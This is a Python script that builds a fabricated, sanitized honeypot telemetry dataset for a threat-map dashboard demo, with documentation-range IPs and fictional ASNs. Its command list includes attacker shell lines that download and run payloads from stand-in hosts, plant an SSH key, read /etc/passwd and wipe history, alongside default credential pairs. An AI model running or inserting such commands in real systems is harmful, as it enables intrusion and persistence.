#!/usr/bin/env python3
"""Generate the sanitized, synthetic ThreatGlobe demo dataset.

Output: backend/data/demo_events.json — raw documents in T-Pot/Elasticsearch
layout, so they flow through the same normalizer as real telemetry.

Everything here is fabricated and sanitized by construction:
* source IPs come only from RFC 5737 documentation ranges
  (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), never real hosts
* ASNs are from the private-use range (64512-65534) with fictional org names
* geolocation is city-level and chosen from a fixed table for visual spread
* credentials are the well-known default/weak pairs honeypots see every day

The generator is deterministic (fixed seed) so the dataset is reproducible:
    python3 scripts/generate_demo_data.py
"""

from __future__ import annotations

import hashlib
import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

SEED = 1337
TARGET_EVENTS = 2400
DAY_START = datetime(2026, 1, 15, tzinfo=UTC)
OUT = Path(__file__).resolve().parent.parent / "backend" / "data" / "demo_events.json"
SENSOR_IP = "192.0.2.10"  # documentation address standing in for the honeypot

# (city, country, ISO code, lat, lon, weight)
CITIES = [
    ("Beijing", "China", "CN", 39.90, 116.40, 9), ("Shanghai", "China", "CN", 31.23, 121.47, 8),
    ("Shenzhen", "China", "CN", 22.54, 114.06, 6), ("Guangzhou", "China", "CN", 23.13, 113.26, 4),
    ("Ashburn", "United States", "US", 39.04, -77.49, 7), ("Dallas", "United States", "US", 32.78, -96.80, 4),
    ("Los Angeles", "United States", "US", 34.05, -118.24, 4), ("Seattle", "United States", "US", 47.61, -122.33, 2),
    ("Chicago", "United States", "US", 41.88, -87.63, 2), ("New York", "United States", "US", 40.71, -74.01, 3),
    ("Moscow", "Russia", "RU", 55.76, 37.62, 6), ("Saint Petersburg", "Russia", "RU", 59.93, 30.36, 3),
    ("Novosibirsk", "Russia", "RU", 55.01, 82.93, 1),
    ("São Paulo", "Brazil", "BR", -23.55, -46.63, 5), ("Rio de Janeiro", "Brazil", "BR", -22.91, -43.17, 2),
    ("Mumbai", "India", "IN", 19.08, 72.88, 4), ("Bengaluru", "India", "IN", 12.97, 77.59, 3),
    ("New Delhi", "India", "IN", 28.61, 77.21, 3),
    ("Hanoi", "Vietnam", "VN", 21.03, 105.85, 3), ("Ho Chi Minh City", "Vietnam", "VN", 10.82, 106.63, 3),
    ("Amsterdam", "Netherlands", "NL", 52.37, 4.90, 4), ("Seoul", "South Korea", "KR", 37.57, 126.98, 3),
    ("Jakarta", "Indonesia", "ID", -6.21, 106.85, 3), ("Singapore", "Singapore", "SG", 1.35, 103.82, 3),
    ("Tokyo", "Japan", "JP", 35.68, 139.69, 2), ("Taipei", "Taiwan", "TW", 25.03, 121.57, 2),
    ("Hong Kong", "Hong Kong", "HK", 22.32, 114.17, 2), ("Bangkok", "Thailand", "TH", 13.76, 100.50, 2),
    ("London", "United Kingdom", "GB", 51.51, -0.13, 2), ("Paris", "France", "FR", 48.86, 2.35, 2),
    ("Bucharest", "Romania", "RO", 44.43, 26.10, 2), ("Kyiv", "Ukraine", "UA", 50.45, 30.52, 1),
    ("Istanbul", "Türkiye", "TR", 41.01, 28.98, 2), ("Tehran", "Iran", "IR", 35.69, 51.39, 2),
    ("Cairo", "Egypt", "EG", 30.04, 31.24, 1), ("Lagos", "Nigeria", "NG", 6.52, 3.38, 1),
    ("Johannesburg", "South Africa", "ZA", -26.20, 28.05, 1), ("Nairobi", "Kenya", "KE", -1.29, 36.82, 1),
    ("Mexico City", "Mexico", "MX", 19.43, -99.13, 2), ("Bogotá", "Colombia", "CO", 4.71, -74.07, 1),
    ("Buenos Aires", "Argentina", "AR", -34.60, -58.38, 1), ("Lima", "Peru", "PE", -12.05, -77.04, 1),
    ("Santiago", "Chile", "CL", -33.45, -70.67, 1), ("Toronto", "Canada", "CA", 43.65, -79.38, 1),
    ("Sydney", "Australia", "AU", -33.87, 151.21, 1), ("Karachi", "Pakistan", "PK", 24.86, 67.01, 1),
    ("Dhaka", "Bangladesh", "BD", 23.81, 90.41, 1), ("Manila", "Philippines", "PH", 14.60, 120.98, 1),
    ("Kuala Lumpur", "Malaysia", "MY", 3.14, 101.69, 1), ("Warsaw", "Poland", "PL", 52.23, 21.01, 1),
    ("Frankfurt", "Germany", "DE", 50.11, 8.68, 2), ("Stockholm", "Sweden", "SE", 59.33, 18.07, 1),
]  # fmt: skip

ORG_SUFFIXES = ["Cloud Hosting", "Telecom", "Broadband", "Datacenter", "Networks", "VPS", "Mobile", "IX Transit"]
ORG_PREFIXES = ["Example", "Sample", "Demo", "Placeholder", "Fictional", "Northwind", "Contoso", "Fabrikam"]
DOC_PREFIXES = ["192.0.2", "198.51.100", "203.0.113"]

SSH_CREDS = [
    ("root", "123456"), ("root", "root"), ("root", "password"), ("admin", "admin"), ("root", "toor"),
    ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("oracle", "oracle"), ("postgres", "postgres"),
    ("test", "test"), ("user", "user"), ("root", "1qaz2wsx"), ("git", "git"), ("deploy", "deploy123"),
    ("administrator", "P@ssw0rd"), ("support", "support"), ("guest", "guest"), ("root", "admin123"),
    ("hadoop", "hadoop"), ("ftpuser", "ftpuser"), ("minecraft", "minecraft"), ("root", "Huawei@123"),
]  # fmt: skip
TELNET_CREDS = [
    ("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "888888"), ("root", "default"),
    ("support", "support"), ("root", "12345"), ("ubnt", "ubnt"), ("root", "anko"), ("guest", "12345"),
    ("admin", "1234"), ("root", "7ujMko0admin"), ("enable", "system"),
]  # fmt: skip
DB_CREDS = [("sa", "sa"), ("root", "root"), ("postgres", "postgres"), ("admin", "admin123"), ("mysql", "mysql")]
COMMANDS = [
    "uname -a", "cat /proc/cpuinfo | grep name | wc -l", "whoami", "free -m", "ls -la /tmp",
    "cd /tmp; wget http://198.51.100.77/bins.sh; chmod +x bins.sh; ./bins.sh",
    "curl -s http://203.0.113.45/x86 -o /tmp/.x; chmod 777 /tmp/.x",
    "echo 'ssh-rsa AAAAB3...demo' >> ~/.ssh/authorized_keys", "crontab -l", "nproc",
    "cat /etc/passwd", "history -c", "busybox wget http://192.0.2.200/mips; chmod +x mips",
]  # fmt: skip
SURICATA_SIGNATURES = [
    "ET SCAN Suspicious inbound to MSSQL port 1433",
    "ET SCAN Potential SSH Scan",
    "ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)",
    "ET SCAN NMAP OS Detection Probe",
    "ET WEB_SERVER Possible CVE-2014-6271 Attempt",
    "ET EXPLOIT Possible Netgear DGN Remote Command Execution",
]
SCAN_PORTS = [80, 443, 8080, 3389, 5900, 6379, 9200, 11211, 27017, 8443, 5060, 1883, 135]

# campaign -> weight
CAMPAIGNS = {
    "ssh_bruteforce": 20,
    "telnet_bruteforce": 9,
    "scanner": 30,
    "smb": 14,
    "web": 12,
    "database": 9,
    "ics": 4,
    "mail": 5,
    "suricata": 10,
}


def make_actors(rng: random.Random, n: int) -> list[dict]:
    weights = [c[5] for c in CITIES]
    used: set[str] = set()
    actors = []
    asn_cache: dict[str, tuple[int, str]] = {}
    while len(actors) < n:
        ip = f"{rng.choice(DOC_PREFIXES)}.{rng.randint(1, 254)}"
        if ip in used or ip == SENSOR_IP:
            continue
        used.add(ip)
        city = rng.choices(CITIES, weights=weights)[0]
        if city[2] not in asn_cache or rng.random() < 0.35:
            asn = rng.randint(64512, 65534)
            org = f"{rng.choice(ORG_PREFIXES)} {rng.choice(ORG_SUFFIXES)} ({city[2]})"
            asn_cache[city[2]] = (asn, org)
        asn, org = asn_cache[city[2]]
        actors.append(
            {
                "ip": ip,
                "city": city,
                "asn": asn,
                "org": org,
                "campaign": rng.choices(list(CAMPAIGNS), weights=list(CAMPAIGNS.values()))[0],
            }
        )
    return actors


def geo(actor: dict, rng: random.Random) -> dict:
    city, country, code, lat, lon, _ = actor["city"]
    return {
        "city_name": city,
        "country_name": country,
        "country_code2": code,
        "latitude": round(lat + rng.uniform(-0.25, 0.25), 3),
        "longitude": round(lon + rng.uniform(-0.25, 0.25), 3),
        "asn": actor["asn"],
        "as_org": actor["org"],
    }


def campaign_docs(actor: dict, start: datetime, rng: random.Random) -> list[dict]:
    """Return the raw documents one actor produces in one visit."""
    docs: list[dict] = []
    t = start
    session = hashlib.sha1(f"{actor['ip']}{start.isoformat()}".encode()).hexdigest()[:12]

    def emit(gap: float, **fields) -> None:
        nonlocal t
        t += timedelta(seconds=gap)
        base = {
            "@timestamp": t.isoformat(),
            "src_ip": actor["ip"],
            "src_port": rng.randint(1024, 65535),
            "dest_ip": SENSOR_IP,
            "geoip": geo(actor, rng),
            "session": session,
            "tags": ["demo", "sanitized"],
        }
        base.update(fields)
        docs.append(base)

    kind = actor["campaign"]
    if kind in ("ssh_bruteforce", "telnet_bruteforce"):
        ssh = kind == "ssh_bruteforce"
        port = rng.choice([22, 22, 22, 2222]) if ssh else rng.choice([23, 23, 2223])
        proto = "ssh" if ssh else "telnet"
        creds = SSH_CREDS if ssh else TELNET_CREDS
        emit(0, type="Cowrie", eventid="cowrie.session.connect", dest_port=port, protocol=proto)
        for _ in range(rng.randint(2, 12)):
            user, pw = rng.choice(creds)
            emit(rng.uniform(1, 9), type="Cowrie", eventid="cowrie.login.failed", dest_port=port,
                 protocol=proto, username=user, password=pw)  # fmt: skip
        if rng.random() < 0.18:
            user, pw = rng.choice(creds)
            emit(rng.uniform(1, 5), type="Cowrie", eventid="cowrie.login.success", dest_port=port,
                 protocol=proto, username=user, password=pw)  # fmt: skip
            for cmd in rng.sample(COMMANDS, rng.randint(1, 4)):
                emit(rng.uniform(0.5, 4), type="Cowrie", eventid="cowrie.command.input", dest_port=port,
                     protocol=proto, username=user, input=cmd)  # fmt: skip
            if rng.random() < 0.45:
                emit(rng.uniform(1, 6), type="Cowrie", eventid="cowrie.session.file_download", dest_port=port,
                     protocol=proto, username=user, shasum=hashlib.sha256(session.encode()).hexdigest(),
                     url="http://198.51.100.77/bins.sh")  # fmt: skip
    elif kind == "scanner":
        for port in rng.sample(SCAN_PORTS, rng.randint(1, 6)):
            emit(rng.uniform(0.2, 20), type="Honeytrap", eventid="honeytrap.connection", dest_port=port)
    elif kind == "smb":
        emit(0, type="Dionaea", eventid="dionaea.connection", dest_port=445, protocol="smb")
        if rng.random() < 0.3:
            emit(rng.uniform(2, 10), type="Dionaea", eventid="dionaea.download.complete", dest_port=445,
                 protocol="smb", shasum=hashlib.md5(session.encode()).hexdigest())  # fmt: skip
    elif kind == "web":
        for _ in range(rng.randint(1, 5)):
            path = rng.choice(["/wp-login.php", "/.env", "/admin", "/cgi-bin/luci", "/phpmyadmin/", "/.git/config"])
            emit(rng.uniform(0.5, 6), type="Tanner", eventid="tanner.request", dest_port=rng.choice([80, 8080]),
                 protocol="http", request_path=path)  # fmt: skip
    elif kind == "database":
        port, proto = rng.choice([(3306, "mysql"), (5432, "postgresql"), (1433, "mssql")])
        for _ in range(rng.randint(2, 8)):
            user, pw = rng.choice(DB_CREDS)
            emit(rng.uniform(1, 8), type="Heralding", eventid="heralding.auth", dest_port=port,
                 protocol=proto, username=user, password=pw)  # fmt: skip
    elif kind == "ics":
        port, proto = rng.choice([(502, "modbus"), (102, "s7comm")])
        emit(0, type="Conpot", eventid="conpot.request", dest_port=port, protocol=proto)
    elif kind == "mail":
        emit(0, type="Mailoney", eventid="mailoney.connection", dest_port=25, protocol="smtp")
    elif kind == "suricata":
        sig = rng.choice(SURICATA_SIGNATURES)
        emit(0, type="Suricata", eventid="suricata.alert", dest_port=rng.choice([80, 1433, 22, 443]),
             alert={"signature": sig, "category": "Attempted Information Leak"})  # fmt: skip
    return docs


def diurnal_weight(hour: float) -> float:
    # Gentle daily rhythm plus an afternoon spike, purely for a readable chart.
    import math

    return 1.0 + 0.45 * math.sin((hour - 6) / 24 * 2 * math.pi) + (0.9 if 14 <= hour < 16 else 0)


def main() -> None:
    rng = random.Random(SEED)
    actors = make_actors(rng, 320)
    docs: list[dict] = []
    while len(docs) < TARGET_EVENTS:
        hour = rng.uniform(0, 24)
        if rng.random() * 2.4 > diurnal_weight(hour):
            continue
        actor = rng.choice(actors)
        docs.extend(campaign_docs(actor, DAY_START + timedelta(hours=hour), rng))

    docs = [d for d in docs if d["@timestamp"] < (DAY_START + timedelta(days=1)).isoformat()]
    docs.sort(key=lambda d: d["@timestamp"])
    docs = docs[:TARGET_EVENTS]

    # A handful of deliberately degraded records prove missing fields don't crash anything.
    for i in range(0, len(docs), 150):
        degraded = docs[i]
        degraded.pop("geoip", None)
    for i in range(75, len(docs), 300):
        docs[i]["dest_port"] = "not-a-port"

    for i, doc in enumerate(docs):
        doc["_id"] = f"demo-{i:05d}"

    payload = {
        "meta": {
            "dataset": "threatglobe-demo",
            "description": "Synthetic, sanitized honeypot telemetry for DEMO MODE. Not real attacks.",
            "ip_ranges": ["192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24"],
            "asn_range": "64512-65534 (private use)",
            "generator": "scripts/generate_demo_data.py",
            "seed": SEED,
            "count": len(docs),
        },
        "events": docs,
    }
    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(json.dumps(payload, ensure_ascii=False, separators=(",", ":")) + "\n", encoding="utf-8")
    print(f"wrote {len(docs)} events to {OUT}")


if __name__ == "__main__":
    main()
